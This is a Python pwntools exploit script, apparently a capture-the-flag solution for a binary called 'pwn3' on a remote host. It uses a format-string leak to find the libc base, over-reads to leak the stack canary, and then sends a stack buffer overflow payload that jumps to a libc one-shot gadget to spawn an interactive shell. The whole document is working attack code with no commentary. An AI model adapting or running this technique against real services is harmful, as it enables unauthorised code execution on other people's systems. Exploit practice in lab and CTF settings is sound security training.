# libc6_2.23-0ubuntu11.2_amd64.so
from pwn import *
from ctypes import *

# context.log_level = 0
# p = process('./pwn3', env={"LD_PRELOAD":"./libc6_2.23-0ubuntu11.2_amd64.so"})
p = remote('34.64.159.111', 12750)
e = ELF('./pwn3')
l = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')
code = CDLL('./raa.so')
oneshot = 0x45226


p.sendlineafter('what your name?', 'bomin')
p.sendafter('key :', '3')
p.sendlineafter('Input :', str(code.gogo()))
sleep(0.3)
p.sendafter('Secret Message :', '%23$p')
base = int(p.recvline().strip(),16) - l.symbols['__libc_start_main'] - 240
print hex(base)

# pause()
p.sendafter('key :', '2')
p.sendlineafter('What do you want to eat?', '8')
p.sendafter('why...', 'A'*10)
p.recvuntil('A'*10)
# print p.recvline()
p.recv(14)
canary = u64(p.recv(8))
print hex(canary)

p.sendafter('key :', '1')
payload = 'A'*(0x70-0x8)
payload += p64(canary)
payload += 'AAAAAAAA'
payload += p64(base + oneshot)
p.sendafter('what your name :', payload)
p.interactive()